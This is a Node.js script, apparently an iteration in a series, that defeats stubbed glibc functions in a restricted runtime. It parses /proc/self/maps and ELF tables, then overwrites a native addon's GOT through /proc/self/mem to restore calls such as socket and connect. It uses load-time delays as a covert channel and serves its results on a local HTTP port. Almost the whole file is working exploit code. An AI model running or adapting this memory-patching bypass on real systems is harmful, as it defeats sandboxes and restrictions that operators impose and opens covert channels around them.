// v24 - GOT overwrite via /proc/self/mem: bypass glibc stubs in .node addons
// 1. Load timing-probe.node (get it into memory, stubs active)
// 2. Parse /proc/self/maps -> addon load base + libc base
// 3. Parse addon ELF -> .rel.plt (GOT slot offsets per function)
// 4. Parse libc ELF -> .dynsym (real function offsets)
// 5. Overwrite GOT slots via /proc/self/mem
// 6. Re-require addon -> time it; if >50ms, glibc WORKS
// Pull server: 8099
try {
  var fs    = require('fs');
  var http  = require('http');
  var net   = require('net');
  var lines = ['=== GOT-overwrite v24 ==='];

  var ADDON = '/home/owner/share/tmp/sdk_tools/timing-probe.node';

  // ---- ELF32 parser ----
  function parseELF32(buf) {
    if (!buf || buf.length < 52) return null;
    // Magic check
    if (buf[0]!==0x7f||buf[1]!==0x45||buf[2]!==0x4c||buf[3]!==0x46) return null;
    var e_shoff     = buf.readUInt32LE(32);
    var e_shentsize = buf.readUInt16LE(46);
    var e_shnum     = buf.readUInt16LE(48);
    var e_shstrndx  = buf.readUInt16LE(50);
    if (e_shoff === 0 || e_shnum === 0) return null;
    var sections = [];
    for (var i = 0; i < e_shnum; i++) {
      var o = e_shoff + i * e_shentsize;
      if (o + 40 > buf.length) break;
      sections.push({
        sh_name_idx: buf.readUInt32LE(o),
        sh_type:     buf.readUInt32LE(o + 4),
        sh_flags:    buf.readUInt32LE(o + 8),
        sh_addr:     buf.readUInt32LE(o + 12),
        sh_offset:   buf.readUInt32LE(o + 16),
        sh_size:     buf.readUInt32LE(o + 20),
        sh_link:     buf.readUInt32LE(o + 24),
        sh_info:     buf.readUInt32LE(o + 28),
        sh_entsize:  buf.readUInt32LE(o + 36),
      });
    }
    // Section name string table
    var shstr = sections[e_shstrndx];
    function getName(sh) {
      var s = shstr.sh_offset + sh.sh_name_idx, e2 = s;
      while (e2 < buf.length && buf[e2] !== 0) e2++;
      return buf.slice(s, e2).toString('ascii');
    }
    var smap = {};
    sections.forEach(function(sh) { smap[getName(sh)] = sh; });
    return { smap: smap, buf: buf };
  }

  // Get string from string table
  function elfStr(buf, sh, idx) {
    var s = sh.sh_offset + idx, e2 = s;
    while (e2 < buf.length && buf[e2] !== 0) e2++;
    return buf.slice(s, e2).toString('ascii');
  }

  // ---- Step 1: Load addon (stubs fill GOT) ----
  try { require(ADDON); } catch(e) { lines.push('step1_load: threw (expected): ' + String(e.message||e).substring(0,40)); }

  // ---- Step 2: Maps ----
  var maps = fs.readFileSync('/proc/self/maps', 'utf8').split('\n');
  var addonLoadBase = 0, libcBase = 0;
  maps.forEach(function(l) {
    if (l.indexOf('timing-probe.node') !== -1 && l.indexOf('r-xp') !== -1) {
      addonLoadBase = parseInt(l.split('-')[0], 16);
    }
    if (l.indexOf('libc-2.24.so') !== -1 && l.indexOf('r-xp') !== -1) {
      libcBase = parseInt(l.split('-')[0], 16);
    }
  });
  lines.push('step2_maps: addonBase=0x' + addonLoadBase.toString(16) + ' libcBase=0x' + libcBase.toString(16));

  if (!addonLoadBase || !libcBase) {
    lines.push('ABORT: could not find maps');
  } else {

  // ---- Step 3: Parse addon ELF -> GOT slots ----
  var addonBuf = fs.readFileSync(ADDON);
  var elfAddon = parseELF32(addonBuf);
  if (!elfAddon) { lines.push('ABORT: addon ELF parse failed'); }
  else {
  var relPlt  = elfAddon.smap['.rel.plt'];
  var dynSym  = elfAddon.smap['.dynsym'];
  var dynStr  = elfAddon.smap['.dynstr'];
  lines.push('step3_secs: rel.plt=' + (relPlt?'found':'MISSING') +
    ' .dynsym=' + (dynSym?'found':'MISSING') + ' .dynstr=' + (dynStr?'found':'MISSING'));

  // Map funcName -> r_offset (GOT slot virtual offset from addon load base)
  var gotSlots = {}; // funcName -> virtual offset of GOT slot
  if (relPlt && dynSym && dynStr) {
    var entSize = relPlt.sh_entsize || 8;
    var count = Math.floor(relPlt.sh_size / entSize);
    for (var i = 0; i < count; i++) {
      var o = relPlt.sh_offset + i * entSize;
      var r_offset = addonBuf.readUInt32LE(o);
      var r_info   = addonBuf.readUInt32LE(o + 4);
      var symIdx   = (r_info >> 8) & 0xffffff;
      var symOff   = dynSym.sh_offset + symIdx * 16;
      var st_name  = addonBuf.readUInt32LE(symOff);
      var funcName = elfStr(addonBuf, dynStr, st_name);
      gotSlots[funcName] = r_offset;
    }
  }
  lines.push('step3_slots: ' + JSON.stringify(Object.keys(gotSlots)));

  // ---- Step 4: Parse libc -> symbol offsets ----
  var libcBuf = fs.readFileSync('/usr/lib/libc-2.24.so');
  var elfLibc = parseELF32(libcBuf);
  var libcOffsets = {};
  if (elfLibc) {
    var lDynSym = elfLibc.smap['.dynsym'];
    var lDynStr = elfLibc.smap['.dynstr'];
    if (lDynSym && lDynStr) {
      var lCount = Math.floor(lDynSym.sh_size / 16);
      for (var j = 0; j < lCount; j++) {
        var lo = lDynSym.sh_offset + j * 16;
        var lst_name  = libcBuf.readUInt32LE(lo);
        var lst_value = libcBuf.readUInt32LE(lo + 4);
        var lst_info  = libcBuf[lo + 12];
        var lst_type  = lst_info & 0xf;
        if (lst_type === 2 && lst_value !== 0) { // STT_FUNC
          var lname = elfStr(libcBuf, lDynStr, lst_name);
          libcOffsets[lname] = lst_value;
        }
      }
    }
  }
  // Report key functions
  var keyFuncs = ['usleep','getpid','socket','connect','send','open','mmap','close','write','munmap'];
  var found = keyFuncs.filter(function(f){ return libcOffsets[f] !== undefined; });
  var missing = keyFuncs.filter(function(f){ return libcOffsets[f] === undefined; });
  lines.push('step4_libc: found=' + found.join(',') + ' missing=' + missing.join(','));
  keyFuncs.forEach(function(f) {
    if (libcOffsets[f]) lines.push('  ' + f + ': 0x' + libcOffsets[f].toString(16) + ' -> VA=0x' + (libcBase + libcOffsets[f]).toString(16));
  });

  // ---- Step 5: Patch GOT via /proc/self/mem ----
  var patched = [];
  var failed = [];
  try {
    var memFd = fs.openSync('/proc/self/mem', 'r+');
    var patchBuf = new Buffer(4);
    Object.keys(gotSlots).forEach(function(funcName) {
      if (libcOffsets[funcName]) {
        var gotVA = addonLoadBase + gotSlots[funcName];
        var realVA = libcBase + libcOffsets[funcName];
        patchBuf.writeUInt32LE(realVA, 0);
        try {
          fs.writeSync(memFd, patchBuf, 0, 4, gotVA);
          patched.push(funcName + '@0x' + gotVA.toString(16) + '->0x' + realVA.toString(16));
        } catch(we) { failed.push(funcName + ':' + String(we.code||we.message)); }
      }
    });
    fs.closeSync(memFd);
  } catch(me) { lines.push('step5_mem: ' + String(me.code||me.message)); }
  lines.push('step5_patched: ' + patched.join(', '));
  if (failed.length) lines.push('step5_failed: ' + failed.join(', '));

  // ---- Step 6: Re-require and time it ----
  // Clear require cache
  delete require.cache[ADDON];
  // Also delete by resolved path
  try { delete require.cache[require.resolve(ADDON)]; } catch(e2) {}

  // Start socket listener on 7780 for addon to connect to
  var socketData = '';
  var srv = net.createServer(function(c) {
    c.on('data', function(d){ socketData += d.toString(); });
    c.on('end', function(){ srv.close(); });
  });
  srv.on('error', function(e){ lines.push('srv7780_err: ' + e.message); });
  srv.listen(7780, '127.0.0.1', function(){ lines.push('srv7780: ready'); });

  // Wait 100ms for server to start, then time the require
  setTimeout(function() {
    var t0 = Date.now();
    try { require(ADDON); lines.push('step6_load: OK'); }
    catch(e) { lines.push('step6_load: threw: ' + String(e.message||e).substring(0,60)); }
    var elapsed = Date.now() - t0;
    lines.push('step6_ms: ' + elapsed);
    if (elapsed < 20) {
      lines.push('RESULT: glibc STILL BROKEN (stubs not patched or GOT wrong)');
    } else if (elapsed < 100) {
      lines.push('RESULT: usleep WORKED! pid_digit=0, socket not tested (need connect test)');
    } else if (elapsed < 1000) {
      var pidDigit = Math.round((elapsed - 50) / 100);
      lines.push('RESULT: glibc WORKS! pid%10 ~= ' + pidDigit);
    } else if (elapsed < 3000) {
      lines.push('RESULT: usleep ok, socket FAILED, errno~=' + Math.round((elapsed-1000)/10));
    } else {
      lines.push('RESULT: socket SUCCEEDED -> full glibc works!');
    }

    setTimeout(function() {
      if (socketData) lines.push('socket_data: ' + socketData.trim());
      var body = lines.join('\n') + '\n=== END ===\n';
      try { fs.writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe24.txt', body); } catch(e3) {}
      var pullSrv = http.createServer(function(req,res){
        res.writeHead(200, {'Content-Type':'text/plain'});
        res.end(body);
      });
      pullSrv.listen(8099, '127.0.0.1', function(){});
      pullSrv.on('error', function(e){});
      setInterval(function(){}, 60000);
    }, 1500);
  }, 200);

  }} // end else blocks

} catch(e) {
  try { require('fs').writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe24-crash.txt', String(e.stack||e.message)); } catch(e2) {}
}
